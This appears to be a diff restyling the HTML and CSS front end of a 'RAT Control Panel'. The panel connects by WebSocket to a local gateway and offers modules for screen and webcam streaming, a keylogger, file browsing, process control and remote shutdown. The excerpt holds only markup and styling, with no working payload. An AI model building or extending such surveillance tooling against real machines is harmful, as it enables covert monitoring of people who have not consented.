@@ -5,25 +5,27 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>RAT Control Panel</title>
 <style>
-  /* ── Design tokens ───────────────────────────────────────── */
   :root {
-    --bg:        #0d0f14;
-    --surface:   #141720;
-    --surface2:  #1c2030;
-    --border:    #252a3a;
-    --accent:    #00e5ff;
-    --accent2:   #7b61ff;
-    --danger:    #ff4757;
-    --warn:      #ffa502;
-    --ok:        #2ed573;
-    --text:      #c8d0e8;
-    --text-dim:  #5a6480;
-    --mono:      'JetBrains Mono', 'Fira Code', monospace;
-    --sans:      'Inter', system-ui, sans-serif;
+    --bg:        #090b10;
+    --surface:   #0f1218;
+    --surface2:  #161b26;
+    --surface3:  #1d2333;
+    --border:    #222840;
+    --accent:    #00d4ff;
+    --accent-dim:#00d4ff22;
+    --purple:    #8b5cf6;
+    --green:     #10b981;
+    --yellow:    #f59e0b;
+    --red:       #ef4444;
+    --text:      #c8d4e8;
+    --text-dim:  #4a5578;
+    --text-mid:  #8898b8;
+    --mono:      'JetBrains Mono','Fira Code',monospace;
+    --sans:      'Inter',system-ui,sans-serif;
+    --radius:    6px;
   }
 
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
   html { font-size: 13px; }
 
   body {
@@ -33,550 +35,759 @@
     min-height: 100vh;
     display: flex;
     flex-direction: column;
-    gap: 0;
+    overflow: hidden;
+    height: 100vh;
   }
 
-  /* ── Top bar ─────────────────────────────────────────────── */
+  /* ── TOP BAR ── */
   #topbar {
     background: var(--surface);
     border-bottom: 1px solid var(--border);
-    padding: 10px 18px;
+    padding: 8px 16px;
     display: flex;
     align-items: center;
-    gap: 12px;
-    flex-wrap: wrap;
-    position: sticky;
-    top: 0;
-    z-index: 100;
+    gap: 10px;
+    flex-shrink: 0;
+    z-index: 50;
   }
 
-  #topbar .brand {
+  .brand {
     font-family: var(--mono);
-    font-size: 1.1rem;
+    font-size: 1rem;
     color: var(--accent);
-    letter-spacing: .12em;
+    letter-spacing: .15em;
+    margin-right: 6px;
     white-space: nowrap;
-    margin-right: 8px;
   }
+  .brand span { color: var(--purple); }
 
   #topbar input {
     background: var(--bg);
     border: 1px solid var(--border);
     color: var(--text);
     font-family: var(--mono);
-    font-size: .9rem;
-    padding: 6px 10px;
-    border-radius: 4px;
+    font-size: .82rem;
+    padding: 5px 9px;
+    border-radius: var(--radius);
     outline: none;
     transition: border-color .2s;
   }
   #topbar input:focus { border-color: var(--accent); }
-  #url-input { width: 220px; }
-  #token-input { width: 260px; letter-spacing: .06em; }
+  #url-input   { width: 210px; }
+  #token-input { width: 240px; letter-spacing: .04em; }
 
+  #status-pill {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 20px;
+    padding: 4px 10px;
+    font-family: var(--mono);
+    font-size: .72rem;
+    color: var(--text-dim);
+    white-space: nowrap;
+    margin-left: auto;
+  }
   #status-dot {
-    width: 10px; height: 10px;
+    width: 7px; height: 7px;
     border-radius: 50%;
     background: var(--text-dim);
-    flex-shrink: 0;
     transition: background .3s, box-shadow .3s;
+    flex-shrink: 0;
   }
-  #status-dot.connected { background: var(--ok); box-shadow: 0 0 8px var(--ok); }
-  #status-dot.connecting { background: var(--warn); box-shadow: 0 0 8px var(--warn); animation: pulse 1s infinite; }
-  #status-dot.error { background: var(--danger); box-shadow: 0 0 8px var(--danger); }
+  #status-dot.connected  { background: var(--green);  box-shadow: 0 0 6px var(--green); }
+  #status-dot.connecting { background: var(--yellow); box-shadow: 0 0 6px var(--yellow); animation: pulse 1s infinite; }
+  #status-dot.error      { background: var(--red);    box-shadow: 0 0 6px var(--red); }
+  @keyframes pulse { 50% { opacity: .35; } }
 
-  @keyframes pulse { 50% { opacity: .4; } }
-
-  #status-label {
-    font-family: var(--mono);
-    font-size: .8rem;
-    color: var(--text-dim);
-    min-width: 110px;
-  }
-
-  /* ── Buttons ─────────────────────────────────────────────── */
+  /* ── BUTTONS ── */
   button {
     cursor: pointer;
     font-family: var(--sans);
-    font-size: .82rem;
+    font-size: .8rem;
     font-weight: 600;
-    padding: 6px 13px;
-    border-radius: 4px;
+    padding: 6px 12px;
+    border-radius: var(--radius);
     border: 1px solid transparent;
     transition: all .15s;
     white-space: nowrap;
+    line-height: 1;
   }
   .btn-primary { background: var(--accent); color: #000; border-color: var(--accent); }
-  .btn-primary:hover { filter: brightness(1.2); }
-  .btn-danger  { background: transparent; color: var(--danger); border-color: var(--danger); }
-  .btn-danger:hover { background: var(--danger); color: #fff; }
-  .btn-ghost   { background: transparent; color: var(--text); border-color: var(--border); }
+  .btn-primary:hover { filter: brightness(1.15); }
+  .btn-danger  { background: transparent; color: var(--red); border-color: var(--red); }
+  .btn-danger:hover { background: var(--red); color: #fff; }
+  .btn-ghost   { background: transparent; color: var(--text-mid); border-color: var(--border); }
   .btn-ghost:hover { border-color: var(--accent); color: var(--accent); }
-  .btn-warn    { background: transparent; color: var(--warn); border-color: var(--warn); }
-  .btn-warn:hover { background: var(--warn); color: #000; }
-  .btn-ok      { background: transparent; color: var(--ok); border-color: var(--ok); }
-  .btn-ok:hover { background: var(--ok); color: #000; }
-  .btn-sm { padding: 3px 8px; font-size: .75rem; }
-  button:disabled { opacity: .35; cursor: not-allowed; }
+  .btn-ok      { background: transparent; color: var(--green); border-color: var(--green); }
+  .btn-ok:hover { background: var(--green); color: #000; }
+  .btn-warn    { background: transparent; color: var(--yellow); border-color: var(--yellow); }
+  .btn-warn:hover { background: var(--yellow); color: #000; }
+  .btn-purple  { background: transparent; color: var(--purple); border-color: var(--purple); }
+  .btn-purple:hover { background: var(--purple); color: #fff; }
+  .btn-sm { padding: 4px 9px; font-size: .73rem; }
+  .btn-xs { padding: 2px 6px; font-size: .68rem; }
+  button:disabled { opacity: .3; cursor: not-allowed; pointer-events: none; }
 
-  /* ── Main layout ─────────────────────────────────────────── */
-  #main {
-    display: grid;
-    grid-template-columns: 1fr 1fr;
-    grid-template-rows: auto auto auto;
-    gap: 1px;
-    background: var(--border);
+  /* ── LAYOUT: sidebar + content ── */
+  #app {
+    display: flex;
     flex: 1;
+    overflow: hidden;
   }
 
-  .panel {
+  /* ── SIDEBAR ── */
+  #sidebar {
+    width: 64px;
     background: var(--surface);
+    border-right: 1px solid var(--border);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 10px 0;
+    gap: 4px;
+    flex-shrink: 0;
+  }
+
+  .nav-item {
+    width: 48px;
+    height: 48px;
+    border-radius: var(--radius);
+    border: 1px solid transparent;
+    background: transparent;
+    cursor: pointer;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 2px;
+    transition: all .15s;
+    color: var(--text-dim);
+    font-size: .55rem;
+    font-family: var(--mono);
+    letter-spacing: .05em;
+    text-transform: uppercase;
+    padding: 0;
+  }
+  .nav-item:hover { background: var(--surface2); border-color: var(--border); color: var(--text-mid); }
+  .nav-item.active { background: var(--accent-dim); border-color: var(--accent); color: var(--accent); }
+  .nav-item .nav-icon { font-size: 1.3rem; line-height: 1; }
+
+  .nav-divider { width: 32px; height: 1px; background: var(--border); margin: 4px 0; }
+
+  /* ── CONTENT ── */
+  #content {
+    flex: 1;
+    overflow: hidden;
+    display: flex;
+    flex-direction: column;
+  }
+
+  .module { display: none; flex: 1; flex-direction: column; overflow: hidden; height: 100%; }
+  .module.active { display: flex; }
+
+  /* ── MODULE HEADER ── */
+  .mod-header {
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    padding: 10px 18px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    flex-shrink: 0;
+  }
+  .mod-title {
+    font-family: var(--mono);
+    font-size: .68rem;
+    letter-spacing: .2em;
+    text-transform: uppercase;
+    color: var(--text-dim);
+  }
+  .mod-title .accent { color: var(--accent); }
+  .mod-actions { display: flex; gap: 8px; align-items: center; margin-left: auto; flex-wrap: wrap; }
+
+  /* ── MODULE BODY ── */
+  .mod-body {
+    flex: 1;
+    overflow: auto;
     padding: 16px;
     display: flex;
     flex-direction: column;
-    gap: 12px;
-    min-height: 260px;
+    gap: 14px;
   }
 
-  .panel-full { grid-column: 1 / -1; }
-
-  .panel-title {
-    font-size: .7rem;
+  /* ── CARDS ── */
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 14px;
+  }
+  .card-title {
+    font-size: .65rem;
     font-family: var(--mono);
-    letter-spacing: .18em;
-    color: var(--text-dim);
+    letter-spacing: .15em;
     text-transform: uppercase;
-    display: flex;
-    align-items: center;
-    gap: 8px;
-  }
-  .panel-title::before {
-    content: '';
-    width: 3px; height: 12px;
-    border-radius: 2px;
-  }
-  .panel-title.stream::before  { background: var(--accent); }
-  .panel-title.process::before { background: var(--accent2); }
-  .panel-title.files::before   { background: var(--ok); }
-  .panel-title.system::before  { background: var(--warn); }
-  .panel-title.log::before     { background: var(--text-dim); }
-
-  /* ── Stream panel ────────────────────────────────────────── */
-  .stream-controls { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }
-
-  .stream-viewers {
-    display: grid;
-    grid-template-columns: 1fr 1fr;
-    gap: 10px;
-    flex: 1;
-  }
-
-  .stream-box {
-    background: var(--bg);
-    border: 1px solid var(--border);
-    border-radius: 6px;
-    overflow: hidden;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    min-height: 180px;
-    position: relative;
-  }
-
-  .stream-box img {
-    width: 100%;
-    height: 100%;
-    object-fit: contain;
-    display: block;
-  }
-
-  .stream-box .placeholder {
     color: var(--text-dim);
-    font-family: var(--mono);
-    font-size: .75rem;
-    text-align: center;
-    padding: 12px;
+    margin-bottom: 10px;
   }
 
-  .stream-label {
-    position: absolute;
-    top: 6px; left: 8px;
-    font-family: var(--mono);
-    font-size: .65rem;
-    color: var(--accent);
-    background: rgba(0,0,0,.6);
-    padding: 2px 6px;
-    border-radius: 3px;
-  }
-
-  .fps-badge {
-    position: absolute;
-    top: 6px; right: 8px;
-    font-family: var(--mono);
-    font-size: .65rem;
-    color: var(--ok);
-    background: rgba(0,0,0,.6);
-    padding: 2px 6px;
-    border-radius: 3px;
-    display: none;
-  }
-
-  /* ── Process panel ───────────────────────────────────────── */
-  .proc-toolbar { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
-
-  #proc-search {
-    background: var(--bg);
-    border: 1px solid var(--border);
-    color: var(--text);
-    font-family: var(--mono);
-    font-size: .8rem;
-    padding: 5px 9px;
-    border-radius: 4px;
-    outline: none;
-    width: 180px;
-    transition: border-color .2s;
-  }
-  #proc-search:focus { border-color: var(--accent2); }
-
-  .proc-table-wrap { overflow-y: auto; max-height: 240px; flex: 1; }
-
-  table {
-    width: 100%;
-    border-collapse: collapse;
-    font-size: .78rem;
-  }
-
+  /* ── TABLES ── */
+  .table-wrap { overflow-y: auto; flex: 1; border: 1px solid var(--border); border-radius: var(--radius); }
+  table { width: 100%; border-collapse: collapse; font-size: .78rem; }
   thead th {
     background: var(--surface2);
     color: var(--text-dim);
     font-family: var(--mono);
-    font-size: .7rem;
+    font-size: .68rem;
     text-align: left;
-    padding: 6px 8px;
+    padding: 7px 10px;
     position: sticky; top: 0;
     border-bottom: 1px solid var(--border);
+    letter-spacing: .08em;
   }
-
+  tbody tr { transition: background .1s; }
   tbody tr:hover { background: var(--surface2); }
-
   td {
-    padding: 5px 8px;
-    border-bottom: 1px solid rgba(37,42,58,.6);
+    padding: 6px 10px;
+    border-bottom: 1px solid rgba(34,40,64,.5);
     font-family: var(--mono);
     vertical-align: middle;
   }
 
-  .gui-badge {
-    font-size: .65rem;
-    padding: 1px 5px;
-    border-radius: 2px;
-    background: rgba(0,229,255,.12);
-    color: var(--accent);
+  .badge {
+    font-size: .62rem; padding: 2px 6px; border-radius: 3px; font-family: var(--mono);
   }
+  .badge-gui    { background: rgba(0,212,255,.12); color: var(--accent); }
+  .badge-ok     { background: rgba(16,185,129,.12); color: var(--green); }
+  .badge-warn   { background: rgba(245,158,11,.12); color: var(--yellow); }
+  .badge-danger { background: rgba(239,68,68,.12);  color: var(--red); }
 
+  .cpu-bar-wrap { display: flex; align-items: center; gap: 5px; }
   .cpu-bar {
-    display: inline-block;
-    height: 6px;
-    border-radius: 3px;
-    background: var(--accent2);
-    min-width: 2px;
-    max-width: 60px;
-    vertical-align: middle;
-    margin-right: 4px;
+    display: inline-block; height: 5px; border-radius: 3px;
+    background: var(--purple); min-width: 2px; transition: width .3s;
   }
 
-  /* ── Files panel ─────────────────────────────────────────── */
-  .file-toolbar { display: flex; gap: 8px; align-items: center; }
-
-  #file-path-input {
+  /* ── INPUTS ── */
+  .field {
     background: var(--bg);
     border: 1px solid var(--border);
     color: var(--text);
     font-family: var(--mono);
-    font-size: .8rem;
-    padding: 5px 9px;
-    border-radius: 4px;
+    font-size: .82rem;
+    padding: 6px 10px;
+    border-radius: var(--radius);
     outline: none;
-    flex: 1;
     transition: border-color .2s;
   }
-  #file-path-input:focus { border-color: var(--ok); }
+  .field:focus { border-color: var(--accent); }
+  .field-sm { padding: 4px 8px; font-size: .75rem; }
 
-  .file-list { overflow-y: auto; max-height: 180px; flex: 1; }
-
-  .file-item {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    padding: 5px 8px;
-    border-bottom: 1px solid rgba(37,42,58,.5);
-    font-family: var(--mono);
-    font-size: .78rem;
+  /* ── STREAM MODULE ── */
+  .stream-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    flex: 1;
+    min-height: 0;
   }
-  .file-item:hover { background: var(--surface2); }
-
-  /* file content viewer */
-  #file-content-box {
+  .stream-box {
     background: var(--bg);
     border: 1px solid var(--border);
-    border-radius: 4px;
-    padding: 10px;
-    font-family: var(--mono);
-    font-size: .75rem;
-    color: var(--ok);
-    white-space: pre-wrap;
-    word-break: break-all;
-    max-height: 120px;
-    overflow-y: auto;
+    border-radius: var(--radius);
+    overflow: hidden;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    min-height: 220px;
+  }
+  .stream-box img { width: 100%; height: 100%; object-fit: contain; display: block; }
+  .stream-placeholder {
+    color: var(--text-dim); font-family: var(--mono); font-size: .72rem; text-align: center;
+    display: flex; flex-direction: column; gap: 6px; align-items: center;
+  }
+  .stream-placeholder .big { font-size: 2rem; opacity: .3; }
+  .stream-badge {
+    position: absolute; top: 8px; left: 10px;
+    font-family: var(--mono); font-size: .62rem;
+    background: rgba(0,0,0,.7); padding: 2px 8px; border-radius: 10px;
+    color: var(--accent); letter-spacing: .1em;
+  }
+  .fps-badge {
+    position: absolute; top: 8px; right: 10px;
+    font-family: var(--mono); font-size: .62rem;
+    background: rgba(0,0,0,.7); padding: 2px 8px; border-radius: 10px;
+    color: var(--green); display: none;
+  }
+  .stream-status {
+    position: absolute; bottom: 8px; left: 50%; transform: translateX(-50%);
+    font-family: var(--mono); font-size: .62rem;
+    background: rgba(0,0,0,.7); padding: 2px 10px; border-radius: 10px;
     display: none;
   }
+  .stream-status.live { display: block; color: var(--red); }
 
-  /* ── System panel ────────────────────────────────────────── */
+  /* ── POWER MODULE ── */
   .metrics-grid {
     display: grid;
-    grid-template-columns: repeat(2, 1fr);
-    gap: 8px;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 10px;
+    margin-bottom: 4px;
   }
-
   .metric-card {
     background: var(--bg);
     border: 1px solid var(--border);
-    border-radius: 6px;
-    padding: 10px 14px;
+    border-radius: var(--radius);
+    padding: 12px 14px;
   }
-  .metric-label { font-size: .65rem; color: var(--text-dim); font-family: var(--mono); letter-spacing: .1em; }
-  .metric-value { font-size: 1.4rem; font-family: var(--mono); color: var(--accent); margin-top: 2px; }
+  .metric-label { font-size: .62rem; font-family: var(--mono); letter-spacing: .12em; color: var(--text-dim); text-transform: uppercase; }
+  .metric-value { font-size: 1.6rem; font-family: var(--mono); color: var(--accent); margin-top: 4px; line-height: 1; }
+  .metric-value.warn { color: var(--yellow); }
+  .metric-value.danger { color: var(--red); }
 
-  .sys-controls { display: flex; gap: 8px; flex-wrap: wrap; }
+  .power-grid {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 8px;
+  }
+  .power-btn {
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 14px 8px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 6px;
+    cursor: pointer;
+    transition: all .15s;
+    color: var(--text-mid);
+    font-family: var(--sans);
+    font-size: .78rem;
+    font-weight: 600;
+  }
+  .power-btn .icon { font-size: 1.6rem; }
+  .power-btn:hover:not(:disabled) { transform: translateY(-2px); }
+  .power-btn.lock:hover:not(:disabled)     { border-color: var(--accent); color: var(--accent); background: var(--accent-dim); }
+  .power-btn.sleep:hover:not(:disabled)    { border-color: var(--purple); color: var(--purple); background: rgba(139,92,246,.1); }
+  .power-btn.restart:hover:not(:disabled)  { border-color: var(--yellow); color: var(--yellow); background: rgba(245,158,11,.1); }
+  .power-btn.shutdown:hover:not(:disabled) { border-color: var(--red); color: var(--red); background: rgba(239,68,68,.1); }
 
-  .keylogger-out {
+  /* ── KEYLOGGER ── */
+  .kl-output {
     background: var(--bg);
     border: 1px solid var(--border);
-    border-radius: 4px;
-    padding: 8px;
+    border-radius: var(--radius);
+    padding: 12px;
     font-family: var(--mono);
-    font-size: .78rem;
-    color: var(--warn);
-    min-height: 50px;
-    max-height: 80px;
+    font-size: .8rem;
+    color: var(--yellow);
+    min-height: 120px;
+    max-height: 280px;
     overflow-y: auto;
     white-space: pre-wrap;
     word-break: break-all;
+    line-height: 1.7;
   }
-
-  /* ── Log console ─────────────────────────────────────────── */
-  #log-panel {
-    grid-column: 1 / -1;
-    min-height: 160px;
-    max-height: 220px;
-  }
-
-  #log-output {
-    background: var(--bg);
-    border: 1px solid var(--border);
-    border-radius: 4px;
-    padding: 10px;
+  .kl-status {
+    display: flex;
+    align-items: center;
+    gap: 8px;
     font-family: var(--mono);
-    font-size: .72rem;
-    overflow-y: auto;
-    flex: 1;
-    max-height: 140px;
+    font-size: .75rem;
+    color: var(--text-dim);
+  }
+  .kl-dot {
+    width: 8px; height: 8px; border-radius: 50%; background: var(--text-dim);
+  }
+  .kl-dot.recording { background: var(--red); box-shadow: 0 0 6px var(--red); animation: pulse 1s infinite; }
+
+  /* ── FILES ── */
+  .path-bar { display: flex; gap: 8px; align-items: center; }
+  .breadcrumb {
+    display: flex; align-items: center; gap: 4px; flex: 1;
+    background: var(--bg); border: 1px solid var(--border); border-radius: var(--radius);
+    padding: 5px 10px; font-family: var(--mono); font-size: .78rem; overflow-x: auto;
+    white-space: nowrap;
+  }
+  .breadcrumb .sep { color: var(--text-dim); margin: 0 2px; }
+
+  .file-list { flex: 1; overflow-y: auto; border: 1px solid var(--border); border-radius: var(--radius); }
+  .file-item {
+    display: flex; align-items: center; gap: 10px; padding: 7px 12px;
+    border-bottom: 1px solid rgba(34,40,64,.5); font-family: var(--mono); font-size: .78rem;
+    cursor: pointer; transition: background .1s;
+  }
+  .file-item:last-child { border-bottom: none; }
+  .file-item:hover { background: var(--surface2); }
+  .file-icon { font-size: 1rem; opacity: .7; flex-shrink: 0; }
+  .file-name { flex: 1; color: var(--text); }
+  .file-viewer {
+    background: var(--bg); border: 1px solid var(--border); border-radius: var(--radius);
+    padding: 12px; font-family: var(--mono); font-size: .75rem; color: var(--green);
+    white-space: pre-wrap; word-break: break-all; max-height: 200px; overflow-y: auto;
+    display: none; line-height: 1.6;
   }
 
-  .log-entry { padding: 2px 0; line-height: 1.5; border-bottom: 1px solid rgba(37,42,58,.3); }
-  .log-entry .ts { color: var(--text-dim); margin-right: 6px; }
-  .log-entry.sent .dir { color: var(--accent2); }
-  .log-entry.recv .dir { color: var(--ok); }
-  .log-entry.err .dir  { color: var(--danger); }
-  .log-entry.info .dir { color: var(--warn); }
-  .log-json { color: var(--text); }
-
-  .log-toolbar { display: flex; gap: 8px; align-items: center; }
-
-  /* ── App launch bar ──────────────────────────────────────── */
-  .launch-bar { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
-  #app-name-input {
-    background: var(--bg);
-    border: 1px solid var(--border);
-    color: var(--text);
-    font-family: var(--mono);
-    font-size: .8rem;
-    padding: 5px 9px;
-    border-radius: 4px;
-    outline: none;
-    width: 140px;
-    transition: border-color .2s;
+  /* ── CONSOLE ── */
+  #console-output {
+    background: var(--bg); border: 1px solid var(--border); border-radius: var(--radius);
+    padding: 10px; font-family: var(--mono); font-size: .72rem;
+    flex: 1; overflow-y: auto; max-height: 160px;
   }
-  #app-name-input:focus { border-color: var(--accent2); }
+  .log-line { padding: 2px 0; border-bottom: 1px solid rgba(34,40,64,.3); display: flex; gap: 8px; line-height: 1.5; }
+  .log-ts   { color: var(--text-dim); flex-shrink: 0; }
+  .log-dir  { flex-shrink: 0; min-width: 40px; }
+  .log-body { color: var(--text); word-break: break-all; }
+  .log-line.sent .log-dir { color: var(--purple); }
+  .log-line.recv .log-dir { color: var(--green); }
+  .log-line.err  .log-dir { color: var(--red); }
+  .log-line.info .log-dir { color: var(--yellow); }
 
-  /* ── Camera index ────────────────────────────────────────── */
-  #cam-index {
-    background: var(--bg);
-    border: 1px solid var(--border);
-    color: var(--text);
-    font-family: var(--mono);
-    font-size: .8rem;
-    padding: 5px 6px;
-    border-radius: 4px;
-    outline: none;
-    width: 50px;
+  /* ── CONSOLE PANEL at bottom ── */
+  #console-panel {
+    background: var(--surface);
+    border-top: 1px solid var(--border);
+    padding: 8px 14px;
+    flex-shrink: 0;
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+    max-height: 180px;
+  }
+  .console-header {
+    display: flex; align-items: center; gap: 8px;
+    font-family: var(--mono); font-size: .65rem; letter-spacing: .15em;
+    color: var(--text-dim); text-transform: uppercase;
   }
 
-  /* ── Scrollbar ───────────────────────────────────────────── */
+  /* ── SEARCH ── */
+  .search-row { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
+
+  /* ── SCROLLBAR ── */
   ::-webkit-scrollbar { width: 5px; height: 5px; }
   ::-webkit-scrollbar-track { background: transparent; }
-  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
 
-  /* ── Divider ─────────────────────────────────────────────── */
-  .sep { border: none; border-top: 1px solid var(--border); margin: 2px 0; }
+  /* ── APPLICATION MODULE ── */
+  .app-status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 4px; }
+  .app-running  { background: var(--green);  box-shadow: 0 0 5px var(--green); }
+  .app-stopped  { background: var(--text-dim); }
 
-  @media (max-width: 760px) {
-    #main { grid-template-columns: 1fr; }
-    .stream-viewers { grid-template-columns: 1fr; }
-    #url-input { width: 150px; }
-    #token-input { width: 180px; }
+  @media (max-width: 720px) {
+    #sidebar { width: 52px; }
+    .nav-item { width: 40px; height: 44px; }
+    .stream-grid { grid-template-columns: 1fr; }
+    .metrics-grid { grid-template-columns: repeat(2, 1fr); }
+    .power-grid { grid-template-columns: repeat(2, 1fr); }
+    #url-input { width: 140px; }
+    #token-input { width: 160px; }
   }
 </style>
 </head>
 <body>
 
-<!-- ── Top Bar ───────────────────────────────────────────────────── -->
+<!-- ── TOP BAR ── -->
 <div id="topbar">
-  <span class="brand">RAT//CP</span>
-  <input id="url-input"   type="text" placeholder="ws://192.168.x.x:8765" value="ws://127.0.0.1:8765">
+  <div class="brand">RAT<span>/</span>CP</div>
+  <input id="url-input"   type="text"     placeholder="ws://192.168.x.x:8765" value="ws://127.0.0.1:8765">
   <input id="token-input" type="password" placeholder="Gateway token">
   <button id="connect-btn" class="btn-primary" onclick="toggleConnect()">Connect</button>
-  <div id="status-dot"></div>
-  <span id="status-label">Disconnected</span>
+  <div id="status-pill">
+    <div id="status-dot"></div>
+    <span id="status-label">Disconnected</span>
+  </div>
 </div>
 
-<!-- ── Main Grid ─────────────────────────────────────────────────── -->
-<div id="main">
+<!-- ── APP ── -->
+<div id="app">
 
-  <!-- ── Stream Panel ──────────────────────────────────────────── -->
-  <div class="panel" style="grid-column: 1 / -1;">
-    <div class="panel-title stream">LIVE STREAM</div>
-    <div class="stream-controls">
-      <button class="btn-ghost" id="screen-stream-btn" onclick="toggleScreenStream()" disabled>▶ Screen Stream</button>
-      <button class="btn-ghost" id="webcam-stream-btn" onclick="toggleWebcamStream()" disabled>▶ Webcam Stream</button>
-      <label style="color:var(--text-dim);font-size:.8rem;">cam#</label>
-      <input id="cam-index" type="number" value="0" min="0" max="9">
-      <button class="btn-ghost btn-sm" onclick="sendCommand('screen_capture',{})" disabled id="snap-screen-btn">📷 Snap Screen</button>
-      <button class="btn-ghost btn-sm" onclick="snapWebcam()" disabled id="snap-cam-btn">📷 Snap Webcam</button>
-    </div>
-    <div class="stream-viewers">
-      <div class="stream-box" id="screen-box">
-        <span class="stream-label">SCREEN</span>
-        <span class="fps-badge" id="screen-fps"></span>
-        <div class="placeholder">— no signal —</div>
+  <!-- ── SIDEBAR ── -->
+  <nav id="sidebar">
+    <button class="nav-item active" data-module="applications" onclick="switchModule('applications')">
+      <span class="nav-icon">🖥</span>
+      <span>Apps</span>
+    </button>
+    <button class="nav-item" data-module="processes" onclick="switchModule('processes')">
+      <span class="nav-icon">⚙️</span>
+      <span>Procs</span>
+    </button>
+    <div class="nav-divider"></div>
+    <button class="nav-item" data-module="screen" onclick="switchModule('screen')">
+      <span class="nav-icon">🖥️</span>
+      <span>Screen</span>
+    </button>
+    <button class="nav-item" data-module="webcam" onclick="switchModule('webcam')">
+      <span class="nav-icon">📷</span>
+      <span>Cam</span>
+    </button>
+    <div class="nav-divider"></div>
+    <button class="nav-item" data-module="keylogger" onclick="switchModule('keylogger')">
+      <span class="nav-icon">⌨️</span>
+      <span>Keys</span>
+    </button>
+    <button class="nav-item" data-module="files" onclick="switchModule('files')">
+      <span class="nav-icon">📁</span>
+      <span>Files</span>
+    </button>
+    <div class="nav-divider"></div>
+    <button class="nav-item" data-module="power" onclick="switchModule('power')">
+      <span class="nav-icon">⚡</span>
+      <span>Power</span>
+    </button>
+  </nav>
+
+  <!-- ── CONTENT ── -->
+  <div id="content">
+
+    <!-- ═══════════════════════════════════════════════ -->
+    <!-- MODULE: APPLICATIONS                           -->
+    <!-- ═══════════════════════════════════════════════ -->
+    <div id="mod-applications" class="module active">
+      <div class="mod-header">
+        <div class="mod-title"><span class="accent">01</span> · Applications</div>
+        <div class="mod-actions">
+          <input id="app-name-input" class="field field-sm" type="text" placeholder="notepad / calc" style="width:130px">
+          <button class="btn-ok btn-sm" id="launch-btn" onclick="launchApp()" disabled>▶ Launch</button>
+          <button class="btn-ghost btn-sm" id="refresh-app-btn" onclick="loadProcesses('applications')" disabled>↻ Refresh</button>
+        </div>
       </div>
-      <div class="stream-box" id="webcam-box">
-        <span class="stream-label">WEBCAM</span>
-        <span class="fps-badge" id="webcam-fps"></span>
-        <div class="placeholder">— no signal —</div>
-      </div>
-    </div>
-  </div>
-
-  <!-- ── Process Panel ─────────────────────────────────────────── -->
-  <div class="panel">
-    <div class="panel-title process">PROCESS MANAGER</div>
-    <div class="proc-toolbar">
-      <button class="btn-ghost" onclick="loadProcesses()" disabled id="load-proc-btn">↻ Refresh</button>
-      <input id="proc-search" type="text" placeholder="Filter by name…" oninput="filterProcesses()">
-    </div>
-    <div class="launch-bar">
-      <input id="app-name-input" type="text" placeholder="notepad / calc">
-      <button class="btn-ok btn-sm" onclick="launchApp()" disabled id="launch-btn">▶ Launch</button>
-    </div>
-    <div class="proc-table-wrap">
-      <table>
-        <thead>
-          <tr>
-            <th>PID</th><th>Name</th><th>CPU%</th><th>RAM%</th><th>GUI</th><th></th>
-          </tr>
-        </thead>
-        <tbody id="proc-tbody"></tbody>
-      </table>
-    </div>
-  </div>
-
-  <!-- ── Files Panel ───────────────────────────────────────────── -->
-  <div class="panel">
-    <div class="panel-title files">SANDBOX FILES</div>
-    <div class="file-toolbar">
-      <input id="file-path-input" type="text" value="." placeholder="C:\RemoteWorkspace or .">
-      <button class="btn-ghost btn-sm" onclick="listFiles()" disabled id="list-files-btn">List</button>
-    </div>
-    <div class="file-list" id="file-list"></div>
-    <pre id="file-content-box"></pre>
-  </div>
-
-  <!-- ── System Panel ──────────────────────────────────────────── -->
-  <div class="panel">
-    <div class="panel-title system">SYSTEM & KEYLOGGER</div>
-    <div class="metrics-grid">
-      <div class="metric-card">
-        <div class="metric-label">RAM USAGE</div>
-        <div class="metric-value" id="ram-val">—</div>
-      </div>
-      <div class="metric-card">
-        <div class="metric-label">UPTIME</div>
-        <div class="metric-value" id="uptime-val" style="font-size:.95rem;padding-top:4px;">—</div>
+      <div class="mod-body">
+        <div class="table-wrap" style="flex:1">
+          <table>
+            <thead>
+              <tr><th>PID</th><th>Application</th><th>CPU %</th><th>RAM (MB)</th><th>Status</th><th></th></tr>
+            </thead>
+            <tbody id="app-tbody"></tbody>
+          </table>
+        </div>
       </div>
     </div>
-    <button class="btn-ghost btn-sm" style="align-self:start" onclick="fetchMetrics()" disabled id="metrics-btn">↻ Metrics</button>
-    <hr class="sep">
-    <div class="sys-controls">
-      <button class="btn-ghost btn-sm" onclick="powerAction('lock')"     disabled id="lock-btn">🔒 Lock</button>
-      <button class="btn-warn  btn-sm" onclick="powerAction('sleep')"    disabled id="sleep-btn">💤 Sleep</button>
-      <button class="btn-warn  btn-sm" onclick="confirmPower('restart')" disabled id="restart-btn">🔄 Restart</button>
-      <button class="btn-danger btn-sm" onclick="confirmPower('shutdown')" disabled id="shutdown-btn">⏻ Shutdown</button>
-    </div>
-    <hr class="sep">
